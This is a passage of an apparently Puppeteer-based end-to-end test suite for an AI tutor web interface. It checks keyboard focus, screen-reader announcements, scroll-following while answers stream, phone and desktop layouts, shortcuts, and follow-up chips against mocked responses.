    await setPrompt("Keyboard check: why does repeated holdout inspection leak information?");
    await page.$eval(sendSelector, (button) => button.focus());
    await page.keyboard.press("Enter");
    await page.waitForSelector(".ai-tutor__message--streaming", { timeout: 5_000 });
    await page.waitForFunction(() => /Stop generating/.test(document.activeElement?.textContent || ""), { timeout: 3_000 }).catch(() => assert.fail("Generate did not move focus to Stop"));
    assert.equal(await page.$eval(".ai-tutor__stream-status", (node) => node.getAttribute("role") || node.getAttribute("aria-live")), null, "the elapsed-time line is still a live region");
    assert.equal(await page.$eval(".ai-tutor__stream-status small", (node) => node.getAttribute("aria-hidden")), "true", "the elapsed seconds are exposed to screen readers");
    assert.equal(await page.$$eval(".ai-tutor__message--streaming [aria-live], .ai-tutor__message--streaming [role='status']", (nodes) => nodes.length), 0, "a live region remained inside the busy streaming answer");
    assert.equal(await page.$eval(".ai-tutor__message--streaming", (node) => node.getAttribute("aria-busy")), "true");
    await page.waitForFunction(() => !document.querySelector(".ai-tutor__message--streaming") && document.querySelector(".ai-tutor__message--assistant"), { timeout: 10_000 });
    await page.waitForFunction(() => document.activeElement?.matches?.(".ai-tutor__message--assistant[data-message-id]"), { timeout: 3_000 }).catch(async () => assert.fail(`completion left focus on ${JSON.stringify(await activeElement())}`));
    assert.match(await announcement(), /answer ready/i, "completion was not announced");

    // Wide content: focusable, named scroll regions; KaTeX's hidden MathML is
    // not an extra invisible Tab stop; the page gains no blank scroll area.
    const regions = await page.$$eval(".ai-tutor__message--assistant .ai-tutor__scroll", (nodes) => nodes.map((node) => ({ tabindex: node.getAttribute("tabindex"), role: node.getAttribute("role"), label: node.getAttribute("aria-label"), overflows: node.scrollWidth > node.clientWidth })));
    assert.deepEqual(regions.map((region) => region.label), ["Table, scrolls sideways", "Equation, scrolls sideways"], `wide table/equation regions were not named: ${JSON.stringify(regions)}`);
    assert.ok(regions.every((region) => region.overflows && region.tabindex === "0" && region.role === "group"), `overflowing regions were not keyboard-scrollable: ${JSON.stringify(regions)}`);
    assert.deepEqual(await page.$$eval(".ai-tutor .katex-mathml math", (nodes) => [...new Set(nodes.map((node) => getComputedStyle(node).overflowX))]), ["visible"], "KaTeX's hidden MathML copy became a focusable scroller");
    const extent = await page.evaluate(() => ({ document: document.documentElement.scrollHeight, app: Math.ceil(document.querySelector(".app-main").getBoundingClientRect().bottom + scrollY) }));
    assert.ok(extent.document <= extent.app + 2, `the conversation extended the page with blank space: ${JSON.stringify(extent)}`);
    const rows = await page.$$eval(".ai-tutor__message-actions", (nodes) => nodes.map((node) => node.scrollWidth - node.clientWidth));
    assert.ok(rows.every((overflow) => overflow <= 1), `answer actions were hidden in a sideways scroller: ${rows}`);
    const chips = await page.$$eval(".ai-tutor__message-meta > span", (nodes) => nodes.map((node) => Math.round(node.getBoundingClientRect().height)));
    assert.ok(chips.every((height) => height <= 24), `message meta chips broke mid-word: ${chips}`);

    // Grounding radiogroup: one Tab stop; arrows move and select. The
    // finished answer's smooth reveal settles before the pointer click.
    await settleScroll(page);
    await page.click(".ai-tutor__source-panel-toggle");
    await page.waitForSelector(".ai-tutor__context.is-open", { timeout: 3_000 });
    assert.equal(await page.$$eval(".ai-tutor__source-modes [role='radio']", (nodes) => nodes.filter((node) => node.tabIndex === 0).length), 1, "the grounding radiogroup has more than one Tab stop");
    await page.$eval(".ai-tutor__source-modes [aria-checked='true']", (node) => node.focus());
    await page.keyboard.press("ArrowDown");
    assert.equal(await page.$eval(".ai-tutor__source-modes [aria-checked='true'] strong", (node) => node.textContent), "Current lesson", "ArrowDown did not select the next grounding scope");
    assert.equal((await activeElement()).text.startsWith("Current lesson"), true, "ArrowDown did not move focus with the selection");
    await page.keyboard.press("Home");
    assert.equal(await page.$eval(".ai-tutor__source-modes [aria-checked='true'] strong", (node) => node.textContent), "Library first", "Home did not select the first grounding scope");

    // A learner who scrolls the page away while an answer streams is not
    // pulled back, during or after it (TFEAT-08). "Jump to latest" is offered
    // meanwhile, and "Answer ready" once it lands out of view.
    await setPrompt("Keyboard check: stream this answer slowly.");
    await page.evaluate(() => { window.__lumenAuditSlowStream = true; });
    await page.$eval(sendSelector, (button) => button.click());
    await page.waitForFunction(() => /characters received/.test(document.querySelector(".ai-tutor__stream-actions")?.textContent || ""), { timeout: 8_000 });
    // The learner scrolls the page back to the top (a wheel gesture, then the
    // scroll itself; emulated touch viewports ignore synthetic wheel scrolling).
    await page.evaluate(() => {
      window.dispatchEvent(new WheelEvent("wheel", { deltaY: -600 }));
      window.scrollTo({ top: 0, behavior: "instant" });
    });
    await new Promise((resolve) => setTimeout(resolve, 250));
    const scrolledTo = await page.evaluate(() => scrollY);
    await new Promise((resolve) => setTimeout(resolve, 800));
    assert.ok(await page.evaluate(() => scrollY) <= scrolledTo + 2, "streaming pulled the page back after the learner scrolled away");
    const pillText = () => page.$eval(".ai-tutor__jump", (node) => node.textContent.trim()).catch(() => "");
    assert.equal(await pillText(), "Jump to latest", "no Jump to latest was offered while the learner read elsewhere");
    assert.deepEqual(await page.$eval(".ai-tutor__jump", (node) => ({ role: node.getAttribute("role"), live: node.getAttribute("aria-live"), tall: node.getBoundingClientRect().height >= 44 })), { role: null, live: null, tall: true }, "the jump pill was a live region or too small to tap");
    await page.waitForFunction(() => !document.querySelector(".ai-tutor__message--streaming"), { timeout: 15_000 });
    await new Promise((resolve) => setTimeout(resolve, 400));
    assert.ok(await page.evaluate(() => scrollY) <= scrolledTo + 2, "completion scrolled a learner who had scrolled away");
    assert.equal(await pillText(), "Answer ready", "a finished answer out of view was not offered");
    // From the keyboard, the pill takes focus to the new answer.
    await page.$eval(".ai-tutor__jump", (button) => button.focus());
    await page.keyboard.press("Enter");
    await page.waitForFunction(() => document.activeElement?.matches?.(".ai-tutor__message--assistant[data-message-id]") && document.activeElement === [...document.querySelectorAll(".ai-tutor__message--assistant[data-message-id]")].at(-1), { timeout: 3_000 }).catch(async () => assert.fail(`Answer ready did not focus the new answer: ${JSON.stringify(await activeElement())}`));
    assert.equal(await page.$(".ai-tutor__jump"), null, "the pill stayed after it was used");
    await settleScroll(page);
    const answerTop = await page.evaluate(() => document.activeElement.getBoundingClientRect().top);
    assert.ok(answerTop >= 0 && answerTop < 852 * 0.66, `Answer ready did not bring the answer's start into view: ${answerTop}`);

    // Phones scroll the page (issue #57): while an answer streams its end
    // stays just above the docked composer. A learner who scrolls up stays
    // there; "Jump to latest" brings the end back, at once under reduced
    // motion, and following resumes.
    const endGap = () => page.evaluate(() => Math.round(document.querySelector(".ai-tutor__composer").getBoundingClientRect().top - document.querySelector(".ai-tutor__conversation-end").getBoundingClientRect().bottom));
    // Following trails each new delta by one frame, so "kept in view" means
    // the end returns just above the composer, not that every sample is.
    const waitForEndAboveComposer = (message) => page.waitForFunction(() => {
      const gap = document.querySelector(".ai-tutor__composer").getBoundingClientRect().top - document.querySelector(".ai-tutor__conversation-end").getBoundingClientRect().bottom;
      return gap >= -2 && gap <= 60;
    }, { timeout: 2_000, polling: "raf" }).catch(async () => assert.fail(`${message}: ${await endGap()}`));
    await setPrompt("Keyboard check: stream a long answer on a phone.");
    await page.evaluate(() => { window.__lumenAuditSlowStream = { paragraphs: 110 }; });
    await page.$eval(sendSelector, (button) => button.click());
    await page.waitForFunction(() => /characters received/.test(document.querySelector(".ai-tutor__stream-actions")?.textContent || "") && document.querySelector(".ai-tutor__message--streaming").getBoundingClientRect().height > 900, { timeout: 8_000 });
    await waitForEndAboveComposer("the streaming answer's end was not kept just above the composer");
    await page.evaluate(() => {
      window.dispatchEvent(new WheelEvent("wheel", { deltaY: -500 }));
      window.scrollBy({ top: -500, behavior: "instant" });
    });
    await page.waitForFunction(() => document.querySelector(".ai-tutor__jump")?.textContent.includes("Jump to latest"), { timeout: 3_000 }).catch(() => assert.fail("no Jump to latest after scrolling up mid-stream"));
    const readingAt = await page.evaluate(() => scrollY);
    await new Promise((resolve) => setTimeout(resolve, 600));
    assert.ok(await page.evaluate(() => scrollY) <= readingAt + 2, "new text pulled the page back down after the learner scrolled up");
    await page.emulateMediaFeatures([{ name: "prefers-reduced-motion", value: "reduce" }]);
    await page.click(".ai-tutor__jump");
    await page.evaluate(() => new Promise((resolve) => requestAnimationFrame(() => requestAnimationFrame(resolve))));
    // Under reduced motion the jump is instant: two frames later the end is
    // at most one new delta below the composer, not a smooth scroll away.
    const jumpedGap = await endGap();
    assert.ok(jumpedGap >= -200 && jumpedGap <= 60, `Jump to latest did not bring the end above the composer at once: ${jumpedGap}`);
    assert.equal(await page.evaluate(() => document.activeElement?.classList.contains("ai-tutor__message--streaming")), true, "Jump to latest left focus behind");
    await new Promise((resolve) => setTimeout(resolve, 600));
    assert.ok(await page.$(".ai-tutor__message--streaming"), "the long stream finished before following could be checked");
    await waitForEndAboveComposer("following did not resume after Jump to latest");
    assert.equal(await page.$(".ai-tutor__jump"), null, "Jump to latest came back while following");
    await page.emulateMediaFeatures([{ name: "prefers-reduced-motion", value: "no-preference" }]);
    await page.waitForFunction(() => !document.querySelector(".ai-tutor__message--streaming"), { timeout: 15_000 });

    // Wider screens keep the conversation's own scroller (phones scroll the
    // page). Inside it, a learner who scrolls back up while text streams
    // stays there; scrolling back to the end resumes following. Touch and
    // mobile emulation stay on, so the page is not reloaded.
    await page.setViewport({ width: 1280, height: 800, deviceScaleFactor: 1, isMobile: true, hasTouch: true });
    await setPrompt("Keyboard check: stream a longer answer.");
    await page.evaluate(() => { window.__lumenAuditSlowStream = { paragraphs: 110 }; });
    await page.$eval(sendSelector, (button) => button.click());
    await page.waitForFunction(() => {
      const surface = document.querySelector(".ai-tutor__conversation");
      return /characters received/.test(document.querySelector(".ai-tutor__stream-actions")?.textContent || "") && surface.scrollHeight > surface.clientHeight + 300;
    }, { timeout: 8_000 });
    await page.$eval(".ai-tutor__conversation", (surface) => { surface.scrollTop = 0; });
    await new Promise((resolve) => setTimeout(resolve, 700));
    const readBack = await page.$eval(".ai-tutor__conversation", (surface) => ({ top: surface.scrollTop, streaming: Boolean(document.querySelector(".ai-tutor__message--streaming")), pill: document.querySelector(".ai-tutor__jump")?.textContent.trim() || "" }));
    assert.equal(readBack.streaming, true, "the long stream finished before the scroll-back check could run");
    assert.ok(readBack.top < 60, `streaming pulled the conversation back down after the learner scrolled up: ${JSON.stringify(readBack)}`);
    assert.equal(readBack.pill, "Jump to latest", "the conversation scroller offered no Jump to latest");
    await page.$eval(".ai-tutor__conversation", (surface) => { surface.scrollTop = surface.scrollHeight; });
    await new Promise((resolve) => setTimeout(resolve, 500));
    const resumed = await page.$eval(".ai-tutor__conversation", (surface) => ({ gap: surface.scrollHeight - surface.scrollTop - surface.clientHeight, streaming: Boolean(document.querySelector(".ai-tutor__message--streaming")) }));
    assert.ok(!resumed.streaming || resumed.gap < 160, `scrolling back to the end did not resume following: ${JSON.stringify(resumed)}`);
    await page.waitForFunction(() => !document.querySelector(".ai-tutor__message--streaming"), { timeout: 15_000 });
    await page.setViewport({ width: 393, height: 852, deviceScaleFactor: 1, isMobile: true, hasTouch: true });

    // A learner's own Stop is a neutral note that receives focus. The answer
    // streams slowly so the Stop cannot race its completion on a busy host.
    await page.evaluate(() => new Promise((resolve) => requestAnimationFrame(() => requestAnimationFrame(resolve))));
    await setPrompt("Keyboard check: stop this one.");
    await page.evaluate(() => { window.__lumenAuditSlowStream = { paragraphs: 40 }; });
    await page.$eval(sendSelector, (button) => button.focus());
    await page.keyboard.press("Enter");
    await page.waitForFunction(() => /Stop generating/.test(document.activeElement?.textContent || ""), { timeout: 3_000 });
    await page.keyboard.press("Enter");
    await page.waitForSelector(".ai-tutor__request-note", { timeout: 5_000 });
    // Stop turns back into Send as the request ends; that same activation
    // must not then submit the question again.
    await new Promise((resolve) => setTimeout(resolve, 600));
    assert.equal(await page.$(".ai-tutor__message--streaming"), null, "Stop sent the stopped question again");
    assert.ok(await page.$(".ai-tutor__request-note"), "Stop sent the stopped question again");
    assert.equal(await page.$(".ai-tutor__request-error"), null, "a learner's own Stop was shown as an error");
    assert.equal(await page.$eval(".ai-tutor__request-note", (node) => node.getAttribute("role")), null, "the Stop note was an assertive alert");
    assert.equal((await activeElement()).className.includes("ai-tutor__request-note"), true, "Stop left focus on <body>");
    assert.match(await announcement(), /Generation stopped/);
    // A phase from the stopped request must not be announced after it.
    await new Promise((resolve) => setTimeout(resolve, 400));
    assert.match(await announcement(), /Generation stopped/, "a stale phase replaced the stop announcement");

    // Clear asks in an in-app dialog: focus starts on Cancel, Escape restores
    // focus to Clear, confirming clears and focuses the tutor heading.
    await page.$eval('[aria-label="Clear AI tutor conversation"]', (button) => button.focus());
    await page.keyboard.press("Enter");
    await page.waitForSelector(".tutor-dialog[role='alertdialog'][aria-modal='true']", { timeout: 3_000 });
    assert.equal((await activeElement()).text, "Cancel", "the confirmation did not focus its safe choice");
    await page.keyboard.press("Tab");
    await page.keyboard.press("Tab");
    assert.equal((await activeElement()).text, "Cancel", "Tab escaped the confirmation dialog");
    await page.keyboard.press("Escape");
    await page.waitForSelector(".tutor-dialog", { hidden: true });
    assert.equal((await activeElement()).label, "Clear AI tutor conversation", "cancelling did not return focus to Clear");
    assert.ok((await page.$$(".ai-tutor__message")).length > 0, "cancelling the confirmation cleared the conversation");
    await page.keyboard.press("Enter");
    await page.waitForSelector(".tutor-dialog");
    await clickByText(page, ".tutor-dialog button", "Clear conversation");
    await page.waitForFunction(() => !document.querySelector(".ai-tutor__message"), { timeout: 5_000 });
    assert.equal((await activeElement()).tag, "H2", "Clear left focus on <body>");
    await waitForStoredHistory(page, "empty");
  } finally {
    await keyboardContext.close();
  }

  // Phone-first layout (issue #57): the docked composer keeps the question
  // box and Send in view, above the bottom navigation, on first load, with a
  // long draft, while an answer streams and after it; the page never scrolls
  // sideways; below 981px the page is the only vertical scroller.
  const layoutViewports = [
    { name: "phone", width: 393, height: 852, isMobile: true, hasTouch: true },
    { name: "small-phone", width: 320, height: 640, isMobile: true, hasTouch: true },
    { name: "phone-se", width: 375, height: 667, isMobile: true, hasTouch: true },
    { name: "tablet", width: 820, height: 1180, isMobile: true, hasTouch: true },
    { name: "desktop", width: 1280, height: 800, isMobile: false, hasTouch: false },
  ];
  for (const viewport of layoutViewports) {
    const layoutContext = await browser.createBrowserContext();
    try {
      const page = await layoutContext.newPage();
      await page.setViewport({ ...viewport, deviceScaleFactor: 1 });
      attachDiagnostics(page, `layout-${viewport.name}`);
      await page.evaluateOnNewDocument(() => {
        try { localStorage.setItem("lumen.ai.local-disclosure-ack.v1", "acknowledged"); } catch { /* consent can still be given in the UI */ }
      });
      await installAiMocks(page, () => secureConfig, { responseDelayMs: 1_200 });
      await page.goto(`${baseUrl}#/ai`, { waitUntil: "networkidle2", timeout: 30_000 });
      await page.waitForSelector(".ai-tutor__connection--ready", { timeout: 10_000 });
      const setLayoutPrompt = (value) => page.$eval(".ai-tutor__composer textarea", (field, text) => {
        Object.getOwnPropertyDescriptor(HTMLTextAreaElement.prototype, "value").set.call(field, text);
        field.dispatchEvent(new Event("input", { bubbles: true }));
      }, value);
      const checkLayout = async (state) => {
        await page.evaluate(() => new Promise((resolve) => requestAnimationFrame(() => requestAnimationFrame(resolve))));
        const layout = await page.evaluate(() => {
          const box = (selector) => document.querySelector(selector)?.getBoundingClientRect();
          const span = (rect) => [Math.round(rect.top), Math.round(rect.bottom)];
          const nav = document.querySelector(".bottom-nav");
          const conversation = document.querySelector(".ai-tutor__conversation");
          return {
            field: span(box(".ai-tutor__composer textarea")),
            send: span(box(".ai-tutor__send")),
            navTop: Math.round(nav && getComputedStyle(nav).display !== "none" ? nav.getBoundingClientRect().top : innerHeight),
            topbar: Math.round(Math.max(0, box(".app-topbar")?.bottom ?? 0)),
            scrollWidth: document.documentElement.scrollWidth,
            innerWidth,
            narrow: matchMedia("(max-width: 980px)").matches,
            nestedScroll: conversation.scrollHeight - conversation.clientHeight,
            reason: (() => {
              const node = document.querySelector(".ai-tutor__disabled-reason");
              const rect = node.getBoundingClientRect();
              return { text: node.textContent, drawn: rect.height > 1 && rect.width > 1, span: span(rect), linked: document.querySelector(".ai-tutor__send").getAttribute("aria-describedby")?.split(" ").includes(node.id) === true };
            })(),
          };
        });
        const inView = ([top, bottom]) => top >= layout.topbar - 1 && bottom <= layout.navTop + 1;
        assert.ok(inView(layout.field) && inView(layout.send), `${viewport.name} ${state}: the question box or Send left the visible area: ${JSON.stringify(layout)}`);
        assert.equal(layout.scrollWidth, layout.innerWidth, `${viewport.name} ${state}: the page scrolls sideways`);
        if (layout.narrow) assert.ok(layout.nestedScroll <= 1, `${viewport.name} ${state}: the conversation became a nested scroller: ${JSON.stringify(layout)}`);
        return layout;
      };
      await checkLayout("first load");
      await setLayoutPrompt(Array.from({ length: 8 }, (_, line) => `Line ${line + 1} of a long draft about ridge and lasso penalties.`).join("\n"));
      await checkLayout("long draft");
      await setLayoutPrompt("Layout check: why does repeated holdout inspection leak information?");
      // A double tap on Send must not land on the Stop it turns into.
      await page.click(".ai-tutor__send");
      await page.click(".ai-tutor__send");
      await page.waitForSelector(".ai-tutor__message--streaming", { timeout: 5_000 });
      await checkLayout("streaming");
      await page.waitForFunction(() => !document.querySelector(".ai-tutor__message--streaming") && document.querySelector(".ai-tutor__message--assistant"), { timeout: 10_000 });
      assert.equal(await page.$(".ai-tutor__request-note"), null, `${viewport.name}: a double tap on Send stopped the answer`);
      // An empty box needs no visible reason line in the dock (the
      // placeholder and the dimmed Send say it), but Send still names it.
      const emptyBox = await checkLayout("answer");
      assert.match(emptyBox.reason.text, /Enter a learning request/, `${viewport.name}: the empty box lost its disabled reason`);
      assert.deepEqual([emptyBox.reason.drawn, emptyBox.reason.linked], [false, true], `${viewport.name}: the empty-box reason was drawn in the dock or unlinked from Send: ${JSON.stringify(emptyBox.reason)}`);
      await page.evaluate(() => window.scrollTo({ top: 0, behavior: "instant" }));
      await checkLayout("answer, page top");
      // A reason the learner must act on stays visible, above the navigation.
      await setLayoutPrompt("Too long. ".repeat(600));
      const tooLong = await checkLayout("prompt too long");
      assert.match(tooLong.reason.text, /Shorten the prompt|reduce it below/, `${viewport.name}: an over-long prompt gave no reason: ${JSON.stringify(tooLong.reason)}`);
      assert.ok(tooLong.reason.drawn && tooLong.reason.linked && tooLong.reason.span[1] <= tooLong.navTop + 1, `${viewport.name}: the over-long prompt's reason was hidden, unlinked or under the navigation: ${JSON.stringify(tooLong)}`);
    } finally {
      await layoutContext.close();
    }
  }

  // Keyboard sending with a mouse or trackpad (TFEAT-10): Enter sends and
  // Shift+Enter starts a new line; Code review keeps Enter for code and
  // sends with Cmd/Ctrl+Enter; Enter never sends while an input method is
  // composing; Up arrow brings back the last question; Esc stops a running
  // answer, but first closes the options sheet.
  const desktopKeysContext = await browser.createBrowserContext();
  try {
    const page = await desktopKeysContext.newPage();
    await page.setViewport({ width: 1280, height: 800, deviceScaleFactor: 1 });
    attachDiagnostics(page, "tutor-desktop-keys");
    await page.evaluateOnNewDocument(() => {
      try { localStorage.setItem("lumen.ai.local-disclosure-ack.v1", "acknowledged"); } catch { /* consent can still be given in the UI */ }
    });
    await installSlowStream(page);
    const calls = await installAiMocks(page, () => secureConfig);
    await page.goto(`${baseUrl}#/ai`, { waitUntil: "networkidle2", timeout: 30_000 });
    await page.waitForSelector(".ai-tutor__connection--ready", { timeout: 10_000 });
    const field = ".ai-tutor__composer textarea";
    const setKeysPrompt = (value) => page.$eval(field, (node, text) => {
      Object.getOwnPropertyDescriptor(HTMLTextAreaElement.prototype, "value").set.call(node, text);
      node.dispatchEvent(new Event("input", { bubbles: true }));
      node.focus();
      node.setSelectionRange(text.length, text.length);
    }, value);
    const fieldValue = () => page.$eval(field, (node) => node.value);
    const waitForAnswerCount = (count) => page.waitForFunction((expected) => document.querySelectorAll(".ai-tutor__message--assistant:not(.ai-tutor__message--streaming)").length >= expected
      && !document.querySelector(".ai-tutor__message--streaming"), { timeout: 10_000 }, count);
    const pressWith = async (modifier, key) => {
      await page.keyboard.down(modifier);
      await page.keyboard.press(key);
      await page.keyboard.up(modifier);
    };

    // The shortcuts sheet ("?") lists the tutor's keys.
    await page.evaluate(() => document.activeElement?.blur?.());
    await page.keyboard.type("?");
    await page.waitForSelector(".shortcuts-dialog", { timeout: 5_000 });
    const tutorShortcuts = await page.$$eval(".shortcuts-dialog .shortcut-group", (groups) => groups.find((group) => group.querySelector("h3")?.textContent === "AI tutor")?.textContent || "");
    assert.match(tutorShortcuts, /Shift \+ Enter[\s\S]*⌘\/Ctrl \+ Enter[\s\S]*Esc[\s\S]*Stop the answer/, "the shortcuts sheet did not list the AI tutor keys");
    await page.keyboard.press("Escape");
    await page.waitForSelector(".shortcuts-dialog", { hidden: true, timeout: 5_000 });

    assert.equal(await page.$eval(".ai-tutor__key-hint", (node) => node.textContent), "Enter to send · Shift+Enter for a new line", "the keyboard hint was missing on a desktop");
    assert.equal(await page.$eval(field, (node) => node.getAttribute("aria-describedby").split(" ").includes(document.querySelector(".ai-tutor__key-hint").id)), true, "the keyboard hint was not linked to the question box");

    await setKeysPrompt("Keyboard send: why does repeated holdout inspection leak information?");
    await page.keyboard.press("Enter");
    await waitForAnswerCount(1);
    assert.equal(calls.respond.length, 1, "Enter did not send exactly once");
    assert.equal(await page.evaluate((selector) => document.activeElement === document.querySelector(selector), field), true, "a keyboard send moved focus out of the question box");

    await setKeysPrompt("Line one");
    await pressWith("Shift", "Enter");
    await new Promise((resolve) => setTimeout(resolve, 400));
    assert.equal(await fieldValue(), "Line one\n", "Shift+Enter did not start a new line");
    assert.equal(calls.respond.length, 1, "Shift+Enter sent the question");

    await chooseMode(page, "Code review");
    assert.match(await page.$eval(".ai-tutor__key-hint", (node) => node.textContent), /^(⌘|Ctrl\+)Enter to send · Enter for a new line$/, "the Code review hint did not name the send shortcut");
    await setKeysPrompt("Review this snippet:");
    await page.keyboard.press("Enter");
    await new Promise((resolve) => setTimeout(resolve, 400));
    assert.equal(await fieldValue(), "Review this snippet:\n", "Enter did not start a new line in Code review");
    assert.equal(calls.respond.length, 1, "Enter sent the question in Code review");
    await page.keyboard.type("total = sum(values)");
    await pressWith("Meta", "Enter");
    await waitForAnswerCount(2);
    assert.equal(calls.respond.length, 2, "Cmd+Enter did not send in Code review");
    assert.equal(calls.respond[1].body.task, "code_review");

    await chooseMode(page, "Explain");
    await setKeysPrompt("Composing text");
    await page.$eval(field, (node) => node.dispatchEvent(new KeyboardEvent("keydown", { key: "Enter", code: "Enter", bubbles: true, cancelable: true, isComposing: true })));
    await new Promise((resolve) => setTimeout(resolve, 400));
    assert.equal(calls.respond.length, 2, "Enter sent the question while an input method was composing");

    await setKeysPrompt("");
    await page.keyboard.press("ArrowUp");
    assert.equal(await fieldValue(), "Review this snippet:\ntotal = sum(values)", "Up arrow did not bring back the last question");
    assert.equal(await activeMode(page), "Code review", "Up arrow did not restore the last question's mode");
    await chooseMode(page, "Explain");

    await setKeysPrompt("Keyboard stop: stream this one.");
    await page.evaluate(() => { window.__lumenAuditSlowStream = { paragraphs: 60 }; });
    await page.keyboard.press("Enter");
    await page.waitForFunction(() => /characters received/.test(document.querySelector(".ai-tutor__stream-actions")?.textContent || ""), { timeout: 8_000 });
    await page.$eval(".ai-tutor__options-toggle", (button) => button.click());
    await page.waitForSelector(".tutor-sheet", { timeout: 5_000 });
    await page.keyboard.press("Escape");
    await page.waitForSelector(".tutor-sheet", { hidden: true, timeout: 5_000 });
    assert.ok(await page.$(".ai-tutor__message--streaming"), "Escape in the options sheet stopped the answer");
    await page.$eval(field, (node) => node.focus());
    await page.keyboard.press("Escape");
    await page.waitForSelector(".ai-tutor__request-note", { timeout: 5_000 });
    assert.equal(await page.$(".ai-tutor__message--streaming"), null, "Escape did not stop the answer");
    assert.match(await page.$$eval(".ai-tutor__message--assistant", (nodes) => nodes.at(-1).textContent), /Stopped early/, "the stopped answer was not marked as stopped early");
    assert.match(await page.$eval(".ai-tutor > p.visually-hidden[role='status']", (node) => node.textContent), /Generation stopped/, "Escape's stop was not announced");

    // Grounded answers show staged progress (TVU-18): the steps follow the
    // library retrieval and the stream's phase events, the passages in use
    // appear once found, and each step, not each second, is announced once.
    await page.evaluate(() => {
      window.__lumenAuditAnnouncements = [];
      const region = document.querySelector(".ai-tutor > p.visually-hidden[role='status']");
      new MutationObserver(() => window.__lumenAuditAnnouncements.push(region.textContent.trim())).observe(region, { childList: true, characterData: true, subtree: true });
    });
    await setKeysPrompt("Progress check: explain the bias-variance trade-off from my notes.");
    await page.evaluate(() => {
      window.__lumenAuditSlowStream = {
        paragraphs: 8,
        phaseDelayMs: 700,
        phases: [
          ["preparing", "Preparing the bounded local-model request."],
          ["generating", "Generating the answer with the local model."],
          ["validating", "Checking completion and grounding before finalizing the answer."],
        ],
      };
    });
    await page.keyboard.press("Enter");
    await page.waitForFunction(() => /^Found \d+ passages?/.test(document.querySelector(".ai-tutor__progress li.is-done")?.textContent || "")
      && document.querySelector(".ai-tutor__progress li.is-active")?.textContent.includes("Drafting the answer"), { timeout: 8_000 }).catch(async () => assert.fail(`the steps did not move from finding passages to drafting: ${await page.$eval(".ai-tutor__message--streaming", (node) => node.textContent).catch(() => "no streaming answer")}`));
    assert.ok((await page.$$(".ai-tutor__progress-sources li")).length >= 1, "the passages in use were not shown while waiting");
    assert.match(await page.$eval(".ai-tutor__progress-sources li", (node) => node.textContent), /^\[S\d+\] \S/, "a source chip did not show its label and title");
    assert.equal(await page.$$eval(".ai-tutor__message--streaming [aria-live], .ai-tutor__message--streaming [role='status']", (nodes) => nodes.length), 0, "the progress steps became a live region inside the busy answer");
    const waitingCopy = await page.$eval(".ai-tutor__message--streaming", (node) => node.textContent);
    assert.doesNotMatch(waitingCopy, /Preparing your answer and checking sources/, "a waiting line repeated the progress steps");
    assert.doesNotMatch(waitingCopy, /egress/i, "the waiting state used pipeline jargon");
    await page.waitForFunction(() => document.querySelector(".ai-tutor__progress li.is-active")?.textContent.includes("Checking citations"), { timeout: 8_000 }).catch(() => assert.fail("the validating phase did not activate Checking citations"));
    await page.waitForFunction(() => !document.querySelector(".ai-tutor__message--streaming"), { timeout: 15_000 });
    const progressAnnouncements = [...new Set(await page.evaluate(() => window.__lumenAuditAnnouncements))].filter(Boolean);
    assert.ok(progressAnnouncements.some((text) => /^Found \d+ passages?\. Drafting the answer…$/.test(text)), `drafting was not announced: ${JSON.stringify(progressAnnouncements)}`);
    assert.ok(progressAnnouncements.includes("Checking citations…"), `checking was not announced: ${JSON.stringify(progressAnnouncements)}`);
    assert.equal(progressAnnouncements.some((text) => /Preparing the bounded|Generating the answer with/.test(text)), false, `stage messages were announced alongside the steps: ${JSON.stringify(progressAnnouncements)}`);
    assert.ok(progressAnnouncements.length <= 5, `progress was announced too often: ${JSON.stringify(progressAnnouncements)}`);
  } finally {
    await desktopKeysContext.close();
  }

  // One-tap follow-ups (TFEAT-02): one group, under the newest complete
  // answer only. A chip sends a visible question in a listed mode with only
  // the answer it follows as memory (up to 3,000 characters of it, not the
  // composer's quarter of the budget), retrieves with that answer's topic,
  // never uses the web, and moves focus to the new answer. When it cannot
  // start, its question lands in the box with the reason; nothing is sent.
  const longAnswer = `## Ridge regression\n\n${"Ridge adds an L2 penalty that shrinks every weight toward zero and trades a little bias for lower variance. ".repeat(43)}`.slice(0, 4_600);
  const followUpsScenario = await newIsolatedPage("follow-ups", {
    mocks: { answerText: (citation, body) => (body.prompt.startsWith("Why does ridge") ? `${longAnswer} [${citation}]` : `## Simpler\n\nRidge keeps weights small. [${citation}]`) },
  });
  try {
    const { page, calls } = followUpsScenario;
    await page.goto(`${baseUrl}#/ai`, { waitUntil: "networkidle2", timeout: 30_000 });
    await page.waitForSelector(".ai-tutor__connection--ready", { timeout: 10_000 });
    assert.equal(await page.$(".ai-tutor__follow-ups"), null, "follow-ups appeared before any answer");
    await setComposerPrompt(page, "Why does ridge regression shrink the weights?");
    await page.$eval(sendSelector, (button) => button.click());
    await waitForAnswers(page, 1);
    const firstRequest = calls.respond.at(-1).body;
    const contextTitles = (body) => String(body.context).split("\n").filter((line) => /^\[S\d+\] /.test(line)).map((line) => line.replace(/^\[S\d+\] /, "").split(" — ")[0]);
    assert.ok(contextTitles(firstRequest).length > 0, "the first answer attached no library passage");
    assert.deepEqual(await page.$$eval(".ai-tutor__message", (nodes) => nodes.map((node) => Boolean(node.querySelector(".ai-tutor__follow-ups")))), [false, true], "follow-ups were not on the newest answer alone");
    assert.deepEqual(await page.$$eval(".ai-tutor__follow-ups button", (nodes) => nodes.map((node) => node.textContent)), ["Simpler", "Give an example", "Go deeper", "Quiz me on this", "Make flashcards", "Check my understanding"]);
    assert.equal(await page.$eval(".ai-tutor__follow-ups", (node) => node.getAttribute("role") === "group" && node.getAttribute("aria-label")), "Follow up on this answer");
    const chipLayout = await page.evaluate(() => ({
      heights: [...document.querySelectorAll(".ai-tutor__follow-ups button, .ai-tutor__message-actions button")].map((node) => Math.round(node.getBoundingClientRect().height)),
      rows: new Set([...document.querySelectorAll(".ai-tutor__follow-ups button")].map((node) => Math.round(node.getBoundingClientRect().top))).size,
      inActions: Boolean(document.querySelector(".ai-tutor__message-actions .ai-tutor__follow-ups")),
      scrollWidth: document.documentElement.scrollWidth,
      innerWidth,
    }));
    assert.equal(chipLayout.heights.every((height) => height >= 44), true, `follow-up or action targets under 44px on a phone: ${chipLayout.heights}`);
    assert.ok(chipLayout.rows <= 3, `six follow-ups took ${chipLayout.rows} rows on a 393px phone`);
    assert.equal(chipLayout.inActions, false, "follow-ups joined the message actions row");
    assert.equal(chipLayout.scrollWidth, chipLayout.innerWidth, "follow-ups made the phone page scroll sideways");

    await clickByText(page, ".ai-tutor__follow-ups button", "Simpler");
    await waitForAnswers(page, 2);
